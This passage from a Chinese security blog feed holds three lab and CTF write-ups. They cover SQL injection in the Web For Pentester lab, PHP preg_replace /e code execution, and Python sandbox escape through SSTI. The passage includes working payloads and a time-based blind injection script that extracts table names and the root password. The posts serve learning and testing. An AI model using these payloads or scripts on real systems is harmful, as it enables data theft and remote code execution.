class="string">'/^-?[0-9]+$/m'</span>)</span><br></pre></td></tr></table></figure><p>符合匹配的内容是必须<strong>开头</strong>到<strong>结尾</strong>都是数字，但是这里用到了一个<strong>正则模式修饰符/m</strong>，这个修饰符的作用是如果检查的字符串中包含了换行符<strong>\n</strong>，那么<strong>行首</strong>和<strong>行末</strong>就会匹配到换行符的<strong>之前</strong>和<strong>之后</strong>，简单而言，就是如果有换行符，那么换行符之前的字符串符合就匹配成功，换行符<strong>\n</strong>的URL编码是<strong>%0a</strong></p><p>给出注出数据库名的payload:<a href="http://192.168.187.141/sqli/example7.php?id=2%0aunion%20select%201,2,database(),4,5" target="_blank" rel="noopener">http://192.168.187.141/sqli/example7.php?id=2%0aunion%20select%201,2,database(),4,5</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-Sql_injection/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Example-8"><a href="#Example-8" class="headerlink" title="Example 8"></a>Example 8</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-Sql_injection/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这关涉及到<strong>order by</strong>后面的注入，排除联合注入，报错注入，所以只剩下盲注了，这里我采用的是基于时间的盲注</p><p>给出注出数据库名的具体payload:<a href="http://192.168.187.141/sqli/example8.php?order=name`,(select%20case%20when%20(ascii(substr(database(),1,1))=100)%20then%20sleep(1)%20else%201%20end)%23" target="_blank" rel="noopener">http://192.168.187.141/sqli/example8.php?order=name`,(select%20case%20when%20(ascii(substr(database(),1,1))=100)%20then%20sleep(1)%20else%201%20end)%23</a></p><p>有了payload，剩下的就是写脚本注入了，脚本代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#注数据库名</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="comment">#print("开始对数据库名的第"+str(i)+"位进行注入")</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">48</span>,<span class="number">123</span>):</span><br><span class="line">        <span class="comment">#print("[+]checking "+chr(j))</span></span><br><span class="line">        url = <span class="string">"http://192.168.187.141/sqli/example8.php?order=name`,(select%20case%20when%20(ascii(substr(database(),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">")%20then%20sleep(1)%20else%201%20end)%23"</span></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        <span class="keyword">if</span> t&gt;=<span class="number">4</span>:</span><br><span class="line">            database = database + chr(j)</span><br><span class="line">            print(<span class="string">"成功注出数据库名的第"</span>+str(i)+<span class="string">"位: "</span>+chr(j))</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> <span class="keyword">and</span> j == <span class="number">122</span>:</span><br><span class="line">        print(<span class="string">"数据库名: "</span>+database)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注数据表名</span></span><br><span class="line">table_name = <span class="string">""</span></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">44</span>,<span class="number">123</span>):</span><br><span class="line">        url = <span class="string">"http://192.168.187.141/sqli/example8.php?order=name`,(select%20case%20when%20(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">")%20then%20sleep(1)%20else%201%20end)%23"</span></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        <span class="keyword">if</span> t&gt;=<span class="number">4</span>:</span><br><span class="line">            table_name = table_name + chr(j)</span><br><span class="line">            print(<span class="string">"成功注出数据表名的第"</span>+str(i)+<span class="string">"位: "</span>+chr(j))</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> <span class="keyword">and</span> j == <span class="number">122</span>:</span><br><span class="line">        print(<span class="string">"数据表名: "</span>+table_name)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注users表下的所有数据列名</span></span><br><span class="line">column_name = <span class="string">""</span></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">44</span>,<span class="number">123</span>):</span><br><span class="line">        url = <span class="string">"http://192.168.187.141/sqli/example8.php?order=name`,(select%20case%20when%20(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">")%20then%20sleep(1)%20else%201%20end)%23"</span></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        <span class="keyword">if</span> t&gt;=<span class="number">4</span>:</span><br><span class="line">            column_name = column_name + chr(j)</span><br><span class="line">            print(<span class="string">"成功注出数据表名的第"</span>+str(i)+<span class="string">"位: "</span>+chr(j))</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> <span class="keyword">and</span> j == <span class="number">122</span>:</span><br><span class="line">        print(<span class="string">"users表下的所有数据列名: "</span>+column_name)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注root用户的密码</span></span><br><span class="line">passwd = <span class="string">""</span></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">44</span>,<span class="number">123</span>):</span><br><span class="line">        url = <span class="string">"http://192.168.187.141/sqli/example8.php?order=name`,(select%20case%20when%20(ascii(substr((select passwd from users where name=0x726f6f74),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">")%20then%20sleep(1)%20else%201%20end)%23"</span></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        <span class="keyword">if</span> t&gt;=<span class="number">4</span>:</span><br><span class="line">            passwd = passwd + chr(j)</span><br><span class="line">            print(<span class="string">"成功注出root用户的密码的第"</span>+str(i)+<span class="string">"位: "</span>+chr(j))</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> <span class="keyword">and</span> j == <span class="number">122</span>:</span><br><span class="line">        print(<span class="string">"root用户的密码: "</span>+passwd)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>这里要注意的是我们输入的<strong>order</strong>参数是经过<strong>mysql_real_escape_string</strong>函数过滤的，所以例如payload中某些表名<strong>users</strong>，需要转化为十六进制<strong>0x7573657273</strong></p><h3 id="Example-9"><a href="#Example-9" class="headerlink" title="Example 9"></a>Example 9</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Web_For_Pentester-Sql_injection/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>同样是<strong>order by</strong>后的注入，区别于上一关的是，这里没有<strong><code></code></strong>，所以稍微修改一下payload即可</p><p>同样给出注出数据名的payload:<a href="http://192.168.187.141/sqli/example9.php?order=name,(select%20case%20when%20(ascii(substr(database(),1,1))=101)%20then%20sleep(1)%20else%201%20end" target="_blank" rel="noopener">http://192.168.187.141/sqli/example9.php?order=name,(select%20case%20when%20(ascii(substr(database(),1,1))=101)%20then%20sleep(1)%20else%201%20end</a>)</p><p>脚本也是上一关的脚本代码稍加修改一下payload部分即可，这里就不再赘述了</p>]]></content>
    
    <summary type="html">
    
      sql
    
    </summary>
    
      <category term="sql" scheme="https://Foxgrin.github.io/categories/sql/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>代码审计-通过preg_replace函数深入命令执行</title>
    <link href="https://Foxgrin.github.io//posts/41464/"/>
    <id>https://Foxgrin.github.io//posts/41464/</id>
    <published>2018-10-16T15:41:00.000Z</published>
    <updated>2018-10-22T13:53:08.012Z</updated>
    
    <content type="html"><![CDATA[<p>代码审计day1<a id="more"></a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近开始学习代码审计，刚好mochazz学长的团队红日安全-代码审计小组正在做一个PHP代码审计的项目，该项目会对一道题目进行细致的分析，我觉得很适合新手学习，就跟进他们的项目，对项目中的题目写出我自己的想法。希望能有所进步。</p><h3 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h3><p>这道题的名字叫做<strong>蜡烛</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">function complexStrtolower($regex,$value)&#123;</span><br><span class="line">return preg_replace(</span><br><span class="line">&apos;/(&apos;. $regex . &apos;)/ei&apos;,</span><br><span class="line">&apos;strtolower(&quot;\\1&quot;)&apos;,</span><br><span class="line">$value</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $regex =&gt; $value)&#123;</span><br><span class="line">echo complexStrtolower($regex,$value) . &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">print_r($_GET);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代码很短，考察的是<strong>preg_replace/e</strong>模式执行任意代码，我们很清楚<strong>preg_replace</strong>函数是通过正则匹配出符合的字符串并对匹配出的字符串进行替换，而<strong>preg_replace/e</strong>模式则可以执行匹配出的字符串，这就导致了命令执行的漏洞。我们先来详细了解一下<strong>preg_replace</strong>函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">preg_replace：(PHP 5.5)</span><br><span class="line"></span><br><span class="line">功能 ： 函数执行一个正则表达式的搜索和替换</span><br><span class="line"></span><br><span class="line">定义 ： mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</span><br><span class="line"></span><br><span class="line">搜索 subject 中匹配 pattern 的部分， 如果匹配成功以 replacement 进行替换</span><br><span class="line"></span><br><span class="line">$pattern 存在 /e 模式修正符，允许代码执行</span><br><span class="line">/e 模式修正符，是 preg_replace() 将 $replacement 当做php代码来执行</span><br></pre></td></tr></table></figure><p>这里使用了/e模式，输入的参数和对应的参数值分别对应于匹配的模式和用于正则匹配的字符串，这两个参数都可以通过GET方式进行控制，但是第二个参数写定了<strong>‘strtolower(“\\1”)’</strong>，那么要如何执行代码呢</p><h4 id="解析1"><a href="#解析1" class="headerlink" title="解析1"></a>解析1</h4><p><strong>‘strtolower(“\\1”)’</strong>其实涉及了正则的反向引用，我们可以看一下W3Cschool对它的解释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">反向引用</span><br><span class="line"></span><br><span class="line">对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &apos;\n&apos; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</span><br></pre></td></tr></table></figure><p><strong>\\1</strong>实际上就是<strong>\1</strong>，即第一个匹配项。那么就很好办，payload已经大致出来了，我们只需要控制匹配模式为<strong>/(.*)/</strong></p><p>，匹配的字符串为<strong>phpinfo()</strong>，就可以执行命令</p><p>现在本地测试一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">'/(.*)/ie'</span>,<span class="string">'strtolower("\\1")'</span>,<span class="string">'phpinfo()'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/代码审计/day1/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>没有成功执行，为什么呢，试着输出函数执行结果，结果为<strong>phpinfo()</strong></p><p>其实，我们执行函数<strong>preg_replace/e</strong>，就是执行下面的过程</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/(.*)/i'</span>,$value,$match);</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">'strtolower("$match[0]");'</span>);</span><br><span class="line">当我们输入$value = <span class="string">'phpinfo()'</span>时</span><br><span class="line">$match[<span class="number">0</span>] = <span class="string">'phpinfo()'</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">'strtolower("phpinfo()");'</span>);</span><br><span class="line">执行结果自然是<span class="string">'phpinfo()'</span></span><br></pre></td></tr></table></figure><p>因为<strong>preg_replace/e</strong>只执行一次代码，即<strong>strtolower</strong>函数，所以我们必须想办法让输入的<strong>phpinfo()</strong>自己执行，这就涉及到了<strong>php动态变量</strong>，根据原贴给出payload为<strong>{${phpinfo()}}</strong>，我一开始也很困惑为什么，我们知道php变量名经过<strong>{}</strong>包裹后会将变量值输出,而这里<strong>phpinfo</strong>被<strong>{}</strong>包裹后会首先执行<strong>phpinfo()</strong>，执行结果返回<strong>true</strong>，那么我们画一个等价的式子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$&#123;phpinfo()&#125;&#125; == &#123;$true&#125; == &#123;null&#125; == &apos;&apos;</span><br></pre></td></tr></table></figure><p>我们继续测试一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">'/(.*)/ie'</span>,<span class="string">'strtolower("\\1")'</span>,<span class="string">'&#123;$&#123;phpinfo()&#125;&#125;'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/代码审计/day1/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功执行了代码<strong>phpinfo()</strong></p><h4 id="解析2"><a href="#解析2" class="headerlink" title="解析2"></a>解析2</h4><p>那么payload是不是已经很明显了：<strong>/?.*={${phpinfo()}}</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/代码审计/day1/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>并没有成功执行，这是因为我们之前是将<strong>.*</strong>直接写入程序的正则表达式中，而本题我们是需要通过GET方式提交<strong>.*</strong>，而很明显我们通过GET提交是没有成功执行<strong>phpinfo()</strong>，我们可以用<strong>var_dump</strong>试着输出一下GET数组</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/代码审计/day1/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们可以看到<strong>点号.</strong>被替换成了<strong>下划线_</strong>，这是因为php自动将非法字符替换成了下划线，我们换个通用字符即可，因此payload:<strong>/?\S*={${phpinfo()}}</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/代码审计/day1/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功执行代码</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>命令执行的函数我们比较熟悉的是<strong>eval</strong>,<strong>assert</strong>，今天通过这个例子，学习了<strong>preg_replace/e</strong>函数执行任意代码，很感谢红日团队提供这么有趣的题目，之后将继续跟进红日团队的审计项目，学习代码审计。</p><p>最后附上参考文章：<a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">深入研究preg_replace与代码执行 </a></p>]]></content>
    
    <summary type="html">
    
      代码审计
    
    </summary>
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Python沙箱逃逸</title>
    <link href="https://Foxgrin.github.io//posts/57375/"/>
    <id>https://Foxgrin.github.io//posts/57375/</id>
    <published>2018-09-19T14:39:00.000Z</published>
    <updated>2018-09-19T17:17:20.526Z</updated>
    
    <content type="html"><![CDATA[<p>之前接触的大部分是PHP写的服务器端，而除了PHP，Python也可以作为服务器端的语言，利用的是Python的flask模块渲染html模板，同时也可能存在Python语句执行的漏洞，这就是SSTI漏洞，即服务器端模板注入，本篇文章通过网鼎杯的两道SSTI题简单学习了解一下Python沙箱逃逸的原理<a id="more"></a></p><h3 id="网鼎杯第二场Web：calc"><a href="#网鼎杯第二场Web：calc" class="headerlink" title="网鼎杯第二场Web：calc"></a>网鼎杯第二场Web：calc</h3><p>题目如下，是一个计算器，可以执行一些简单的算式，根据题目的提示，可能对我们的输入存在正则匹配过滤，需要我们注意正则表达式</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Python沙箱逃逸/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[0-9.]+\s*[*+-/]\s*[0-9.]+</span><br></pre></td></tr></table></figure><p>这里的正则表达式存在两个问题</p><p>1.首先是[*+-/]，我们知道’-‘在正则表达式里有特别的意义，表示范围，而在这里并没有被转义，说明是从’+’-‘/‘的字符</p><p>2.正则表达式并没有给出$结尾符，说明我们只需要符合前面的匹配，后面可以任意构造语句执行</p><p>我们可以试着访问index.php</p><p>出现了报错信息</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Python沙箱逃逸/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>从报错信息可以看出，这里是python写的web</p><p>这里先给出payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1+1,().__class__.__base__.__subclasses__()[40](&apos;/flag&apos;).read()</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Python沙箱逃逸/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>下面我们在Python 2.7环境中一步步看看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[40](&apos;/flag&apos;).read()</span><br></pre></td></tr></table></figure><p>为什么就能读取flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__</span><br><span class="line">&lt;type <span class="string">'tuple'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__</span><br><span class="line">&lt;type <span class="string">'tuple'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__</span><br><span class="line">&lt;type <span class="string">'object'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__</span><br><span class="line">&lt;built-<span class="keyword">in</span> method __subclasses__ of type object at <span class="number">0x6CFEA8E0</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()</span><br><span class="line">[&lt;type <span class="string">'type'</span>&gt;, &lt;type <span class="string">'weakref'</span>&gt;, &lt;type <span class="string">'weakcallableproxy'</span>&gt;, &lt;type <span class="string">'weakproxy'</span>&gt;</span><br><span class="line">, &lt;type <span class="string">'int'</span>&gt;, &lt;type <span class="string">'basestring'</span>&gt;, &lt;type <span class="string">'bytearray'</span>&gt;, &lt;type <span class="string">'list'</span>&gt;, &lt;type <span class="string">'N</span></span><br><span class="line"><span class="string">oneType'</span>&gt;, &lt;type <span class="string">'NotImplementedType'</span>&gt;, &lt;type <span class="string">'traceback'</span>&gt;, &lt;type <span class="string">'super'</span>&gt;, &lt;typ</span><br><span class="line">e <span class="string">'xrange'</span>&gt;, &lt;type <span class="string">'dict'</span>&gt;, &lt;type <span class="string">'set'</span>&gt;, &lt;type <span class="string">'slice'</span>&gt;, &lt;type <span class="string">'staticmethod'</span>&gt;,</span><br><span class="line"> &lt;type <span class="string">'complex'</span>&gt;, &lt;type <span class="string">'float'</span>&gt;, &lt;type <span class="string">'buffer'</span>&gt;, &lt;type <span class="string">'long'</span>&gt;, &lt;type <span class="string">'frozen</span></span><br><span class="line"><span class="string">set'</span>&gt;, &lt;type <span class="string">'property'</span>&gt;, &lt;type <span class="string">'memoryview'</span>&gt;, &lt;type <span class="string">'tuple'</span>&gt;, &lt;type <span class="string">'enumerate'</span></span><br><span class="line">&gt;, &lt;type <span class="string">'reversed'</span>&gt;, &lt;type <span class="string">'code'</span>&gt;, &lt;type <span class="string">'frame'</span>&gt;, &lt;type <span class="string">'builtin_function_or_</span></span><br><span class="line"><span class="string">method'</span>&gt;, &lt;type <span class="string">'instancemethod'</span>&gt;, &lt;type <span class="string">'function'</span>&gt;, &lt;type <span class="string">'classobj'</span>&gt;, &lt;type <span class="string">'</span></span><br><span class="line"><span class="string">dictproxy'</span>&gt;, &lt;type <span class="string">'generator'</span>&gt;, &lt;type <span class="string">'getset_descriptor'</span>&gt;, &lt;type <span class="string">'wrapper_desc</span></span><br><span class="line"><span class="string">riptor'</span>&gt;, &lt;type <span class="string">'instance'</span>&gt;, &lt;type <span class="string">'ellipsis'</span>&gt;, &lt;type <span class="string">'member_descriptor'</span>&gt;, &lt;typ</span><br><span class="line">e <span class="string">'file'</span>&gt;, &lt;type <span class="string">'PyCapsule'</span>&gt;, &lt;type <span class="string">'cell'</span>&gt;, &lt;type <span class="string">'callable-iterator'</span>&gt;, &lt;type</span><br><span class="line"><span class="string">'iterator'</span>&gt;, &lt;type <span class="string">'sys.long_info'</span>&gt;, &lt;type <span class="string">'sys.float_info'</span>&gt;, &lt;type <span class="string">'EncodingMap</span></span><br><span class="line"><span class="string">'</span>&gt;, &lt;type <span class="string">'fieldnameiterator'</span>&gt;, &lt;type <span class="string">'formatteriterator'</span>&gt;, &lt;type <span class="string">'sys.version_i</span></span><br><span class="line"><span class="string">nfo'</span>&gt;, &lt;type <span class="string">'sys.flags'</span>&gt;, &lt;type <span class="string">'sys.getwindowsversion'</span>&gt;, &lt;type <span class="string">'exceptions.Bas</span></span><br><span class="line"><span class="string">eException'</span>&gt;, &lt;type <span class="string">'module'</span>&gt;, &lt;type <span class="string">'imp.NullImporter'</span>&gt;, &lt;type <span class="string">'zipimport.zipim</span></span><br><span class="line"><span class="string">porter'</span>&gt;, &lt;type <span class="string">'nt.stat_result'</span>&gt;, &lt;type <span class="string">'nt.statvfs_result'</span>&gt;, &lt;<span class="class"><span class="keyword">class</span> '<span class="title">warnings</span>.</span></span><br><span class="line">WarningMessage'&gt;, &lt;class 'warnings.catch_warnings'&gt;, &lt;class '_weakrefset._Iterat</span><br><span class="line">ionGuard<span class="string">'&gt;, &lt;class '</span>_weakrefset.WeakSet<span class="string">'&gt;, &lt;class '</span>_abcoll.Hashable<span class="string">'&gt;, &lt;type '</span>cl</span><br><span class="line">assmethod<span class="string">'&gt;, &lt;class '</span>_abcoll.Iterable<span class="string">'&gt;, &lt;class '</span>_abcoll.Sized<span class="string">'&gt;, &lt;class '</span>_abcol</span><br><span class="line">l.Containe<span class="string">r'&gt;, &lt;class '</span>_abcoll.Callable<span class="string">'&gt;, &lt;type '</span>dict_keys<span class="string">'&gt;, &lt;type '</span>dict_items</span><br><span class="line"><span class="string">'&gt;, &lt;type '</span>dict_values<span class="string">'&gt;, &lt;class '</span>site._Printe<span class="string">r'&gt;, &lt;class '</span>site._Helpe<span class="string">r'&gt;, &lt;type</span></span><br><span class="line"><span class="string"> '</span>_sre.SRE_Pattern<span class="string">'&gt;, &lt;type '</span>_sre.SRE_Match<span class="string">'&gt;, &lt;type '</span>_sre.SRE_Scanne<span class="string">r'&gt;, &lt;class</span></span><br><span class="line"><span class="string"> '</span>site.Quitte<span class="string">r'&gt;, &lt;class '</span>codecs.IncrementalEncode<span class="string">r'&gt;, &lt;class '</span>codecs.Incrementa</span><br><span class="line">lDecode<span class="string">r'&gt;, &lt;type '</span>operator.itemgette<span class="string">r'&gt;, &lt;type '</span>operator.attrgette<span class="string">r'&gt;, &lt;type '</span>o</span><br><span class="line">perator.methodcalle<span class="string">r'&gt;, &lt;type '</span>functools.partial<span class="string">'&gt;, &lt;type '</span>MultibyteCodec<span class="string">'&gt;, &lt;ty</span></span><br><span class="line"><span class="string">pe '</span>MultibyteIncrementalEncode<span class="string">r'&gt;, &lt;type '</span>MultibyteIncrementalDecode<span class="string">r'&gt;, &lt;type '</span></span><br><span class="line">MultibyteStreamReade<span 